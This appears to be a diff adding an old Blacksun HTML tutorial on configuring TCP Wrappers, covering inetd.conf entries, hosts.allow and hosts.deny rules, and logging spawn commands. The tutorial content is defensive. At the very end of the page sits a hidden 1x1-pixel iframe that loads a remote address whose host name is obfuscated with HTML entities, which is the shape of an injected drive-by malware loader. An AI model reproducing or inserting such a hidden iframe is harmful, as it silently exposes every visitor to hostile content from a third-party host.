@@ -1,0 +1,374 @@
+<HTML>
+<HEAD>
+<title>TCP Wrappers Disclosed</title>
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</STYLE>
+
+</HEAD>
+<BODY aLink=#ccff00 bgColor=#000000 leftMargin=20 link=#99ccff text=#cccccc 
+topMargin=3 vLink=#cc99ff marginwidth="0" marginheight="0">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk">http://blacksun.box.sk</a> 
+                            
+                           _____________________________
+    ______________________I       <b>   Topic:</b>            I_____________________
+   \                      I                            I                    /
+    \     HTML by:        I        <b>TCP Wrappers</b>        I   Written by:     /
+    >                     I         <b>Disclosed</b>          I                  < 
+   /      <a href="mailto:rammal81@hotmail.com">Mikkkeee</a>        I____________________________I   <a href="mailto:rammal81@hotmail.com">Mikkkeee</a>        \
+  /__________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table><br>
+   
+
+<BR>
+
+<P>1-<A HREF="#basic intro">Basic Introduction to TCP Wrappers</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#808080">=</FONT>        <A HREF="#logging">Logging</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#999999">=</FONT>        <A HREF="#links">Finding
+TCP Wrappers(links)</A>
+
+<P>2-C<A HREF="#config/setting">onfigure/setting up TCP Wrappers</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#808080">=</FONT><A HREF="#inetd.conf">Configure
+the inetd.conf file</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#808080">=</FONT><A HREF="#hosts.allow">hosts.allow</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#808080">=</FONT><A HREF="#hosts.deny">hosts.deny</A>
+<BR><FONT COLOR="#FF0000">-</FONT><FONT COLOR="#808080">=</FONT><A HREF="#variables">Optional
+variables for shells commands</A>
+
+<P>3-<A HREF="#conclusion">Conclusion</A>
+<p>4-<A HREF="#shoutz">Greetz</a>
+
+<P>Well here is another guide on a topic not covered by many tutorial writers.
+This guide is somewhat intermediate so many concepts won't be discussed
+cause they have been covered in other articles. You can always check
+<a href="http://blacksun.box.sk">http://blacksun.box.sk</a> for the concepts not covered here.
+
+<P>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+<BR><A NAME="basic intro"></A>1-Basic Introduction to TCP Wrappers
+<BR>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+<P>Many of you guys reading this tutorial are not old enough to remember
+the development of the TCP/IP protocols many years ago in the plan to help
+join the variety of networks connected to the first Internet. Those first
+systems to implement the TCP/IP protocols were government sites and academic
+sites run by scientists, academics and government individuals. During the
+early days, the need for security was nothing like the need we have today.
+The User Datagram Protocol (UDP), Transmission Control Protocol (TCP) and
+the Internet Protocol (IP) were all created with security as the least
+important aspect in mind. The utilities that were developed later
+like Telnet and FTP share the same faulty security, ie, both utilities
+enforce "security" by making the user input a username and password that
+is valid on the remote system. This security is faulty because both the
+username/password are sent on the network as clear text and anyone with
+little experience can sniff the user/pass with great ease. As advancements
+in technology and TCP/IP progressed, TCP/IP became the most popular protocol
+when it was implemented on Novell Netware and the UNIX operating system.
+As the Internet came into our homes, the default network protocol package
+has become adopted on all major computers and software vendors.
+<BR>&nbsp;With this sudden surge in technology there is always the little
+thing called "security" that has to be satisfied. Now there are many different
+products that can be used by an admin to enhance his network security,
+hence the idea of a firewall and its components, one of them is " TCP wrappers."&nbsp;
+Dealing with constant hacker attacks against his University's computers,
+<a href="mailto:wietse@wzv.win.tue.nl">Wietse Venema</a> from Eindhoven University of Technology was the first person
+to develop TCP wrappers. So now you ask what are they? Well TCP Wrappers
+restrict which networks services can be used and which hosts are going
+to be allowed to use these services. TCP Wrappers can be configured to
+handle many of the basic netowrk services found our on your unix box, ie,&nbsp;
+Finger, FTP, Telnet, Rlogin,TFTP and the list goes on and on. Well
+we have to answer what do these services share in common, well if you haven't
+noticed they all share a one-to-one mapping between the service name and
+the executable program that provides the service, so that sets us up on
+the intro, on to how TCP wrappers work.
+<p>-=-=-=-=-=
+<br><A NAME="logging"></A>Logging
+<br>-=-=-=-=-=<br>
+<BR>On a linux box, when the inetd daemon gets a network request, it first
+determines which service to startup based on the port number the service
+runs from. In the file /etc/services a mapping of port numbers to
+service names can be found. After inetd has processed which service to
+start up, it then reads inetd.conf to know what program it should run to
+answer the network request. Now for the TCP Wrappers Daemon (tcpd)
+to make access/deny control decisions and to perform its duties of logging,
+you must first edit the inetd.conf file to specify that the tcpd runs instead
+of the executable that normally satisfies the service request. tcpd
+performs its job by allowing the host that is making the request to use
+the service, if allowed tcpd starts the executable for that specific service,
+so in all TCP wrappers really work by putting itself between inetd and
+the network service requested.
+<BR>In the last paragraph i mentioned something about the logging ability
+of TCP wrapper, well that will be explained here. TCP Wrappers allow you
+to log who is using the service on your box so you can trace and halt any
+suspicious activity waiting. Logging information is sent to the syslogd,
+which also provides the core logging facility for the unix box. To tell
+syslogd what to do with these log enteries, you can control what is done
+by editing the /etc/syslog.conf file. Setup on default, TCP wrappers
+sends its logging info to the same place as the transaction logs of the
+sendmail daemon, so syslogd can log info to one or more files, either the
+system or user console.
+<BR>Since I am guessing your an intermediate linux user, you might have
+already come across TCP wrappers before as part of your linux/unix package.
+TCP Wrappers usually come in .c code so you have to compile it, you
+should be familiar with compiling code on your box. TCP wrappers are very
+popular among security people and paranoid hackers so first check your
+linux package cause you might already have one and if you don't here are
+some links.<br><p>
+-=-=-=-=-=<br>
+<A NAME="links"></A>Links<br>-=-=-=-=-=
+
+<P><a href="ftp://ftp.porcupine.org/pub/security/index.html">ftp://ftp.porcupine.org/pub/security/index.html</a> * get everything at this page!
+<BR>Here are some more significant links if you wish to learn more about the tcp wrapper package!<br>
+<a href="ftp://cert.org:/pub/tools/tcp_wrappers/tcp_wrappers.*">ftp://cert.org:/pub/tools/tcp_wrappers/tcp_wrappers.*</a>
+<br>
+<a href="ftp.win.tue.nl:/pub/security/long_tcp.shar.Z">ftp.win.tue.nl:/pub/security/long_tcp.shar.Z</a>
+<br>
+<a href="http://packetstorm.securify.com">http://packetstorm.securify.com</a>
+
+<BR>
+
+<P>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+<BR>2-<A NAME="config/setting"></A>Configure/Setting up TCP Wrappers
+<BR>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+<P>Now that you have found the TCP wrapper source code/compiled successfully
+you will need to config/setup TCP wrappers. When you have the tcpd executable,
+you now have to go to the second job, editing inetd.conf, hosts.allow,
+and hosts.deny!
+
+<P><A NAME="inetd.conf"></A>Configure the inetd.conf file
+<BR>Lets configure the inetd daemon first!
+
+<P>to edit this file at the prompt type the following
+<BR>root@mike:~# pico /etc/inetd.conf
+<BR>that will bring up the configuration file up in pico, here is a sample
+of an entery that can be found in your inetd.conf file.
+<BR>&nbsp;
+<BR>&nbsp;
+
+<PRE>
+		              wait/nowait
+			      if wait, inetd starts up a process for a 	
+   	                      request then waits till done to start another 
+			      request.  If nowait starts up a process and 
+            stream	      doesn't wait till it starts another process, 
+      dgram, or datagram      but simply goes and does the next.
+	     \  	       \
+     ftp   stream     tcp   nowait  root  /usr/sbin/wu.ftpd wu.fptd -l -i -o
+       /                 \               \            \              \  
+name of service         protocol        Uid either     \              \  
+like telnet, finger     tcp or udp      root or another \              |
+			defined in      user             \             |
+			/etc/protocols           name of server        | 
+			file                     program inetd         |
+					         starts up             |
+                                                                       | 
+							command line argument</PRE>
+
+
+<BR>
+
+<P>
+
+
+
+
+
+
+
+
+Now you have got a simplified view of the entery this is the entery used
+to start the ftp service for the example i showed above. In this entery&nbsp;
+/usr/sbin/wu.ftpd so for the TCP wrapper proggie to become involved this
+line above needs to be edited, so simply add this. /usr/sbin/tcpd
+the rest can stay as they were. You need to do this change in each line
+found in inetd.conf that starts the service that you want to use with the
+TCP wrapper. If you want to close that service simply add a # in from of
+ftp all the way to the left and your ftp service port (21) should now be
+closed.
+<BR>Now for the changes you have done to take effect you must either reboot
+your box or restart the inetd by typing:
+
+<P>root@mike:~# killall -HUP inetd
+
+<P>If you don't really know what your really doing, a good idea is to chattr
+the inetd.conf, this command stops any changes being made by accident and
+stops renaming and linking.
+
+<P>root@mike:~# chattr +i /etc/inetd.conf
+
+<P>to edit inetd.conf you just got to do the reverse
+
+<P>root@mike:~# chattr -i /etc/inetd.conf
+
+<P>&nbsp;Now that we configured the tcpd to mangage network services by
+editing inetd.conf, we now have to edit the two filz i mentioned above,
+host.allow and hosts.deny, which are for allowing/denying which hosts are
+allowed/denied access to your box.
+
+<P>-=-=-=-=-=-=-=-=-=-=-=-
+<BR><A NAME="hosts.allow"></A>Configure hosts.allow
+<BR>-=-=-=-=-=-=-=-=-=-=-=-
+<BR>Now after configureing the internet deamon, we have to configure the
+hosts.allow file which gives access to which hosts you are going to allow
+access. The configuration of hosts.allow/hosts.deny is very similar.
+The
+<BR>basic syntax for these filz is
+
+<P>&nbsp;The daemon list : Client list : shell command
+
+<P>Lets start with the daemon list, this syntax is used to give the name
+of the service to which the rule applies. To place more than one
+service you seperate each sevice with a comma. The Client list you
+are going to use an IP address, host name or a dns to which your
+going to allow, and to allow more than one simply put a comma after each.
+It is very important if you can to allow certain ip's instead of a DNS,
+because host spoofing if easier than ip spoofing so keep that in mind.
+The shell command is optional yet very vital/usefull, keep reading to find
+out why.
+
+<P>One thing that many people always forget about TCP wrappers is that
+the first matching rule that tcpd finds when it seaches is the one that
+it is going to use, so in other words once a match is found it stops looking.&nbsp;
+This is very bad because if no match is found in either allow/deny files
+then access by default will be granted. TCP wrappers first check
+hosts.allow first so its is very important to halt any ip's you don't want
+in that file first instead of putting them in hosts.deny, so one way to
+solve this fault in TCP wrappers is to deny access to all then select/grant
+access to those who need access(people/hosts your trust).
+
+<P>Operator key words
+<BR>==============
+<BR>Here some some key words you can use for these parameters so you can
+make configureing these two filz easier. Examples will follow.
+
+<P>LOCAL = This key word will match any host whose name doens't have a
+dot character.
+
+<P>UNKNOWN =This key word will match the host whose name or address is
+not known.
+
+<P>ALL = This key word will match all hosts and services used.
+<BR>&nbsp;
+
+<P>KNOWN = This key word matches any host/user whose address is known.
+
+<P>EXCEPT = This key word acts as an if/or ie, group1 EXCEPT group2
+
+<P>---------
+<BR>Here is an example of an hosts.allow file (this is fake)
+
+<P>ALL : All@127.0.0.1 : ALLOW
+<BR>in.sshd : zopa.com
+<BR>inet.ftpd : roster.zopa.com
+<BR>ALL : .zopa.com EXCEPT cracker.zopa.com
+
+<P>Here all the hosts in the zopa.com domain are allowed to
+use sshd, but roster is the only subdomain which will have access to use
+ftpd, and the others can't access ftpd.  In the last line all hosts
+of zopa.com's domain will be allowed access to use all services but except
+the subdomain cracker.zopa.com . Notice it is more important to deny access
+in hosts.allow cause till TCP wrapper checks hosts.deny the access will
+be given access to the host because I had allowed access to zopa.com which
+is a match for the host thus it will grant access before even checking
+cracker.zopa.com if i had placed it in the hosts.deny folder. So its is
+obvious that to use the 'EXCEPT' keyword in hosts.allow is better
+than putting the host in host.deny!
+
+<P>Now we don't want to leave hosts.deny empty we should place this command.
+
+<P>Here is an of&nbsp;<A NAME="hosts.deny"></A>hosts.deny
+
+<P>ALL : ALL
+
+<P>==========
+<BR>This will put a security that will deny access to all that isn't explicitly
+granted access will be denied any access.
+
+<P>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+<BR><A NAME="variables"></A>Optional variables for shells commands
+<BR>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+<P>You can also implement the optional shell command variables. Many people
+don't use this optional feature cause its becomes too technical but if
+you understand it can lead you to forshadow any incoming attack.
+
+<P>I will tell you some variables to use with shell commands here.
+
+<P>{-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=}
+<BR>%u This variable will return the client username
+
+<P>%d This variable will return the daemon process
+
+<P>%p This variable will return the daemon process ID
+
+<P>%a This variable will return the client host address.
+
+<P>%c This variable will return information about the
+<BR> client, like host name or user@host.
+
+<P>%h This variable will return the server hostname, and
+<BR> if it can't find it, it will return the address.
+<BR>{-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=}
+
+<P>Okay this is enough let me show you an example.
+
+<P>Thic could be an example of a line you might want to put in your hosts.deny
+
+<P>
+
+ALL : ALL spawn (echo Attempt from %h %a to %d %p at 'date' | tee /var/log/tcp.deny.log | mail rammal81@hotmail.com )
+<br>or something like the bottom but the above is preferred! <br>
+in.fptd : .zopa.com : (/usr/bin/fingerd -l @%h | /usr/ucb/mail -s %d
+%c %h root) 
+
+<P>so if access was denied to hosts from .zopa.com root would recieve an
+email with info that are parallel to the variable description.
+<BR>
+<p>-=-=-=-=-=-=
+<br><A NAME="conclusion"></A>Conclusion
+<br>-=-=-=-=-=-=
+<BR>One thing you should always keep in mind is that if a hacker wants
+to root your box TCP wrappers will help but are not the 100% inpenetrable
+line of defence. If you are going to use tcp wrappers as the only means of protecting yourself via hosts.deny as your only means of blocking inbound traffic you better use ipchains or block the traffic before it reaches your host via a hardware firewall or a router. Now lets get serious we can't afford that so we have to use ipchains as our real world option, and if you can I am coming over to your house, hehe. Ipchains is very good/flexible because it blocks traffic at the kernel level before the packet is read by inetd or tcpd. I won't bother going further into ipchains because way better tutorials have been written on the topic so search of them at the security sites. Back to tcp wrappers, you should use the utilities called <a href="http://uw7doc.sco.com/cgi-bin/man/man?tcpdchk+1Mtcp">tcpdchk</a> and <a href="http://uw7doc.sco.com/cgi-bin/man/man?tcpmatch+1Mtcp">tcpmatch</a>,  which come
+with the TCP wrapper package and are explained pretty well in the links given. Also IP's can be spoofed so always keep that in mind with a lot
+of time an attacker can know which hosts you allow and can spoof as them.
+One other thing you should keep in mind is that TCP wrappers are only used
+to start up the correct daemon that will be satisfying the correct request
+so don't use it for services like NFS which deal with multiple clients
+requests when started. Okay i hope you learned something here, if you have
+anything to add to this phile or have found some errors, plz email me and
+i'll fix it up. thx<br>
+<p>-=-=-=-=-
+<br><A NAME="shoutz"></A>Greetz
+<br>-=-=-=-=-
+<br>Well there are just too many to give greetz to, but everyone from Box Network, the kewl members of Blacksun, the wonderful visitors who come everyday and the peeps who answer the daily post don't think i forgot ya! Ohh and everyone on irc.box.sk in all #channels. Ahh before i forget, a huge greetz also goes out to Cube and Kript0n for always being there. Thx!
+<P>EOF
+<BR>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
